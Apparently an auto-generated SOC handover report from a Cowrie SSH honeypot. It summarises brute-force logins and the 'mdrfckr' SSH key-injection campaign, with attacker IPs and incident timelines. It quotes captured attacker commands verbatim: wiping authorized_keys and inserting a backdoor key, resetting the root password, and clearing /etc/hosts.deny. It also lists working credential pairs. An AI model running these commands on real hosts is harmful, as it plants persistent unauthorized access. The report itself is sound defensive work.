# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T09:25:38Z |
| **Shift Time** | 09:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **242** |
| Confirmed Threats | **216** |
| False Positives Filtered | **26** (10.7%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **6** |
| High Severity Cases | **80** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **162** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **180** |
| Unique Credential Pairs | **104** |
| Unique Usernames | **51** |
| Unique Passwords | **94** |
| Successful Auth Pairs | **50** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 80 |
| `345gs5662d34` | 39 |
| `ubuntu` | 5 |
| `user` | 5 |
| `postgres` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 38 |
| `123456` | 6 |
| `password` | 3 |
| `test` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 38 |
| `root` | `Qazwsx001$` | 2 |
| `teamspeak` | `Teamspeak8` | 1 |
| `ubuntu` | `root@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `aaCC111` | `14.103.118.145` | 2026-04-15T07:27:24 |
| `root` | `Qazwsx0.` | `113.31.107.103` | 2026-04-15T07:32:21 |
| `root` | `3245gs5662d34` | `113.31.107.103` | 2026-04-15T07:32:25 |
| `root` | `Root11111111#$` | `144.48.243.18` | 2026-04-15T07:35:17 |
| `root` | `3245gs5662d34` | `144.48.243.18` | 2026-04-15T07:35:20 |
| `root` | `Qazwsx001$` | `172.206.32.4` | 2026-04-15T07:36:10 |
| `root` | `3245gs5662d34` | `172.206.32.4` | 2026-04-15T07:36:16 |
| `root` | `qazwsxedc123456` | `14.103.84.166` | 2026-04-15T07:36:17 |
| `root` | `Root888!@#` | `93.39.209.147` | 2026-04-15T07:36:55 |
| `root` | `3245gs5662d34` | `93.39.209.147` | 2026-04-15T07:36:59 |
| `root` | `debian` | `144.48.243.18` | 2026-04-15T07:37:35 |
| `root` | `AA1234567890` | `93.39.209.147` | 2026-04-15T07:38:26 |
| `root` | `Qwertyuiop!123456` | `20.153.204.5` | 2026-04-15T07:40:06 |
| `root` | `3245gs5662d34` | `20.153.204.5` | 2026-04-15T07:40:09 |
| `root` | `987654321` | `172.172.196.177` | 2026-04-15T07:40:43 |
| `root` | `3245gs5662d34` | `172.172.196.177` | 2026-04-15T07:40:48 |
| `root` | `Root2019#$` | `93.39.209.147` | 2026-04-15T07:41:36 |
| `root` | `qwertyuiop12` | `93.39.209.147` | 2026-04-15T07:43:00 |
| `root` | `321456` | `14.103.120.130` | 2026-04-15T07:44:22 |
| `root` | `qazwsx01@123` | `93.39.209.147` | 2026-04-15T07:44:27 |
| `root` | `3245gs5662d34` | `14.103.120.130` | 2026-04-15T07:44:31 |
| `root` | `vps123` | `20.153.204.5` | 2026-04-15T07:45:54 |
| `root` | `root112233#` | `93.39.209.147` | 2026-04-15T07:45:56 |
| `root` | `root0@@` | `20.153.204.5` | 2026-04-15T07:47:53 |
| `root` | `p@$$w0rd` | `93.39.209.147` | 2026-04-15T07:48:55 |
| `root` | `admin@2026` | `172.172.196.177` | 2026-04-15T07:52:37 |
| `root` | `qweasd` | `172.172.196.177` | 2026-04-15T07:54:22 |
| `root` | `1212` | `172.172.196.177` | 2026-04-15T07:56:01 |
| `root` | `Ad123456` | `172.172.196.177` | 2026-04-15T07:57:42 |
| `root` | `0` | `93.39.209.147` | 2026-04-15T07:59:10 |
| `root` | `Zxcvbn123` | `20.153.204.5` | 2026-04-15T07:59:23 |
| `root` | `123..com` | `172.172.196.177` | 2026-04-15T07:59:27 |
| `root` | `Qazwsx001$` | `172.172.196.177` | 2026-04-15T08:01:10 |
| `root` | `Aa12345!` | `93.39.209.147` | 2026-04-15T08:02:03 |
| `root` | `Qazwsx111111!!` | `93.39.209.147` | 2026-04-15T08:05:06 |
| `root` | `Redhat123` | `144.48.243.18` | 2026-04-15T08:05:15 |
| `root` | `Lx123456@` | `20.153.204.5` | 2026-04-15T08:05:22 |
| `root` | `Az123456789` | `20.153.204.5` | 2026-04-15T08:07:21 |
| `root` | `123456Qq` | `172.172.196.177` | 2026-04-15T08:07:50 |
| `root` | `root999#$` | `93.39.209.147` | 2026-04-15T08:08:09 |
| `root` | `Qwer123456789` | `172.172.196.177` | 2026-04-15T08:09:28 |
| `root` | `qwert33333` | `93.39.209.147` | 2026-04-15T08:11:01 |
| `root` | `qazwsx2026!!` | `20.153.204.5` | 2026-04-15T08:11:16 |
| `root` | `a123456789z` | `144.48.243.18` | 2026-04-15T08:12:11 |
| `root` | `Qazwsx123456789@@` | `20.153.204.5` | 2026-04-15T08:13:20 |
| `root` | `admin1@3` | `172.172.196.177` | 2026-04-15T08:14:37 |
| `root` | `roott` | `46.101.74.113` | 2026-04-15T08:14:54 |
| `root` | `3245gs5662d34` | `46.101.74.113` | 2026-04-15T08:14:58 |
| `root` | `passw0rd!` | `20.153.204.5` | 2026-04-15T08:15:17 |
| `root` | `Root888#` | `172.172.196.177` | 2026-04-15T08:16:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **242** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 214 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 204 | 12 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 204 | 12 | Modern SSH client |
| `95420f9d932d...` | libssh | 10 | 4 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 38 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:CPXidpcjYCe8"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.118.145`, `14.103.84.166`, `144.48.243.18`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.153.204.5`, `14.103.120.130`, `113.31.107.103`, `93.39.209.147`, `172.206.32.4`, `46.101.74.113`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **10** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8069` | Microsoft Corporation | 1 | HIGH |
| `AS12874` | Fastweb SpA | 1 | HIGH |
| `AS134762` | CHINANET Liaoning province Dalian MAN network | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (80)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-993e76c25dd2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]145` |
| **First Seen** | 2026-04-15 07:27 |
| **Last Seen** | 2026-04-15 07:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CPXidpcjYCe8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:27:21` | `cowrie.session.connect` |
| `2026-04-15 07:27:21` | `cowrie.client.version` |
| `2026-04-15 07:27:22` | `cowrie.client.kex` |
| `2026-04-15 07:27:24` | `cowrie.login.success` |
| `2026-04-15 07:27:24` | `cowrie.session.params` |
| `2026-04-15 07:27:24` | `cowrie.command.input` |
| `2026-04-15 07:27:24` | `cowrie.command.failed` |
| `2026-04-15 07:27:24` | `cowrie.log.closed` |
| `2026-04-15 07:27:25` | `cowrie.session.params` |
| `2026-04-15 07:27:25` | `cowrie.command.input` |
| `2026-04-15 07:27:25` | `cowrie.session.file_download` |
| `2026-04-15 07:27:25` | `cowrie.log.closed` |
| `2026-04-15 07:27:35` | `cowrie.session.params` |
| `2026-04-15 07:27:35` | `cowrie.command.input` |
| `2026-04-15 07:27:35` | `cowrie.log.closed` |
| `2026-04-15 07:27:35` | `cowrie.session.params` |
| `2026-04-15 07:27:35` | `cowrie.command.input` |
| `2026-04-15 07:27:36` | `cowrie.log.closed` |
| `2026-04-15 07:27:36` | `cowrie.session.params` |
| `2026-04-15 07:27:36` | `cowrie.command.input` |
| `2026-04-15 07:27:36` | `cowrie.session.file_download` |
| `2026-04-15 07:27:36` | `cowrie.log.closed` |
| `2026-04-15 07:27:36` | `cowrie.session.params` |
| `2026-04-15 07:27:36` | `cowrie.command.input` |
| `2026-04-15 07:27:36` | `cowrie.log.closed` |
| `2026-04-15 07:27:37` | `cowrie.session.params` |
| `2026-04-15 07:27:37` | `cowrie.command.input` |
| `2026-04-15 07:27:37` | `cowrie.log.closed` |
| `2026-04-15 07:27:37` | `cowrie.session.params` |
| `2026-04-15 07:27:37` | `cowrie.command.input` |
| `2026-04-15 07:27:37` | `cowrie.command.input` |
| `2026-04-15 07:27:38` | `cowrie.log.closed` |
| `2026-04-15 07:27:38` | `cowrie.session.params` |
| `2026-04-15 07:27:38` | `cowrie.command.input` |
| `2026-04-15 07:27:38` | `cowrie.log.closed` |
| `2026-04-15 07:27:38` | `cowrie.session.params` |
| `2026-04-15 07:27:38` | `cowrie.command.input` |
| `2026-04-15 07:27:39` | `cowrie.log.closed` |
| `2026-04-15 07:27:39` | `cowrie.session.params` |
| `2026-04-15 07:27:39` | `cowrie.command.input` |
| `2026-04-15 07:27:39` | `cowrie.log.closed` |
| `2026-04-15 07:27:39` | `cowrie.session.params` |
| `2026-04-15 07:27:39` | `cowrie.command.input` |
| `2026-04-15 07:27:39` | `cowrie.log.closed` |
| `2026-04-15 07:27:40` | `cowrie.session.params` |
| `2026-04-15 07:27:40` | `cowrie.command.input` |
| `2026-04-15 07:27:40` | `cowrie.log.closed` |
| `2026-04-15 07:27:40` | `cowrie.session.params` |
| `2026-04-15 07:27:40` | `cowrie.command.input` |
| `2026-04-15 07:27:40` | `cowrie.log.closed` |
| `2026-04-15 07:27:41` | `cowrie.session.params` |
| `2026-04-15 07:27:41` | `cowrie.command.input` |
| `2026-04-15 07:27:41` | `cowrie.log.closed` |
| `2026-04-15 07:27:41` | `cowrie.session.params` |
| `2026-04-15 07:27:41` | `cowrie.command.input` |
| `2026-04-15 07:27:41` | `cowrie.log.closed` |
| `2026-04-15 07:27:42` | `cowrie.session.params` |
| `2026-04-15 07:27:42` | `cowrie.command.input` |
| `2026-04-15 07:27:42` | `cowrie.log.closed` |
| `2026-04-15 07:27:42` | `cowrie.session.params` |
| `2026-04-15 07:27:42` | `cowrie.command.input` |
| `2026-04-15 07:27:42` | `cowrie.log.closed` |
| `2026-04-15 07:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]145` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf5e17d472b

| Field | Detail |
|---|---|
| **Source IP** | `113.31.107[.]103` |
| **First Seen** | 2026-04-15 07:32 |
| **Last Seen** | 2026-04-15 07:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:32:21` | `cowrie.session.connect` |
| `2026-04-15 07:32:21` | `cowrie.client.version` |
| `2026-04-15 07:32:21` | `cowrie.client.kex` |
| `2026-04-15 07:32:21` | `cowrie.login.success` |
| `2026-04-15 07:32:22` | `cowrie.session.params` |
| `2026-04-15 07:32:22` | `cowrie.command.input` |
| `2026-04-15 07:32:22` | `cowrie.command.failed` |
| `2026-04-15 07:32:22` | `cowrie.log.closed` |
| `2026-04-15 07:32:22` | `cowrie.session.params` |
| `2026-04-15 07:32:22` | `cowrie.command.input` |
| `2026-04-15 07:32:22` | `cowrie.session.file_download` |
| `2026-04-15 07:32:22` | `cowrie.log.closed` |
| `2026-04-15 07:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.107[.]103` to AbuseIPDB if not already reported
- [ ] Block `113.31.107[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b33be6431e1

| Field | Detail |
|---|---|
| **Source IP** | `113.31.107[.]103` |
| **First Seen** | 2026-04-15 07:32 |
| **Last Seen** | 2026-04-15 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:32:24` | `cowrie.session.connect` |
| `2026-04-15 07:32:24` | `cowrie.client.version` |
| `2026-04-15 07:32:24` | `cowrie.client.kex` |
| `2026-04-15 07:32:25` | `cowrie.login.success` |
| `2026-04-15 07:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.107[.]103` to AbuseIPDB if not already reported
- [ ] Block `113.31.107[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93209880b74

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 07:35 |
| **Last Seen** | 2026-04-15 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:35:16` | `cowrie.session.connect` |
| `2026-04-15 07:35:16` | `cowrie.client.version` |
| `2026-04-15 07:35:16` | `cowrie.client.kex` |
| `2026-04-15 07:35:17` | `cowrie.login.success` |
| `2026-04-15 07:35:17` | `cowrie.session.params` |
| `2026-04-15 07:35:17` | `cowrie.command.input` |
| `2026-04-15 07:35:17` | `cowrie.command.failed` |
| `2026-04-15 07:35:17` | `cowrie.log.closed` |
| `2026-04-15 07:35:17` | `cowrie.session.params` |
| `2026-04-15 07:35:17` | `cowrie.command.input` |
| `2026-04-15 07:35:17` | `cowrie.session.file_download` |
| `2026-04-15 07:35:17` | `cowrie.log.closed` |
| `2026-04-15 07:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-002baebe800f

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 07:35 |
| **Last Seen** | 2026-04-15 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:35:20` | `cowrie.session.connect` |
| `2026-04-15 07:35:20` | `cowrie.client.version` |
| `2026-04-15 07:35:20` | `cowrie.client.kex` |
| `2026-04-15 07:35:20` | `cowrie.login.success` |
| `2026-04-15 07:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9876f193a88

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-15 07:36 |
| **Last Seen** | 2026-04-15 07:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:36:09` | `cowrie.session.connect` |
| `2026-04-15 07:36:09` | `cowrie.client.version` |
| `2026-04-15 07:36:09` | `cowrie.client.kex` |
| `2026-04-15 07:36:10` | `cowrie.login.success` |
| `2026-04-15 07:36:11` | `cowrie.session.params` |
| `2026-04-15 07:36:11` | `cowrie.command.input` |
| `2026-04-15 07:36:11` | `cowrie.command.failed` |
| `2026-04-15 07:36:11` | `cowrie.log.closed` |
| `2026-04-15 07:36:11` | `cowrie.session.params` |
| `2026-04-15 07:36:11` | `cowrie.command.input` |
| `2026-04-15 07:36:12` | `cowrie.session.file_download` |
| `2026-04-15 07:36:12` | `cowrie.log.closed` |
| `2026-04-15 07:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3f0974c03b

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-15 07:36 |
| **Last Seen** | 2026-04-15 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:36:15` | `cowrie.session.connect` |
| `2026-04-15 07:36:15` | `cowrie.client.version` |
| `2026-04-15 07:36:15` | `cowrie.client.kex` |
| `2026-04-15 07:36:16` | `cowrie.login.success` |
| `2026-04-15 07:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb13f3921114

| Field | Detail |
|---|---|
| **Source IP** | `14.103.84[.]166` |
| **First Seen** | 2026-04-15 07:36 |
| **Last Seen** | 2026-04-15 07:36 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8v7dkBq5H5NL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:36:16` | `cowrie.session.connect` |
| `2026-04-15 07:36:16` | `cowrie.client.version` |
| `2026-04-15 07:36:16` | `cowrie.client.kex` |
| `2026-04-15 07:36:17` | `cowrie.login.success` |
| `2026-04-15 07:36:17` | `cowrie.session.params` |
| `2026-04-15 07:36:17` | `cowrie.command.input` |
| `2026-04-15 07:36:17` | `cowrie.command.failed` |
| `2026-04-15 07:36:17` | `cowrie.log.closed` |
| `2026-04-15 07:36:17` | `cowrie.session.params` |
| `2026-04-15 07:36:17` | `cowrie.command.input` |
| `2026-04-15 07:36:18` | `cowrie.session.file_download` |
| `2026-04-15 07:36:18` | `cowrie.log.closed` |
| `2026-04-15 07:36:34` | `cowrie.session.params` |
| `2026-04-15 07:36:34` | `cowrie.command.input` |
| `2026-04-15 07:36:34` | `cowrie.log.closed` |
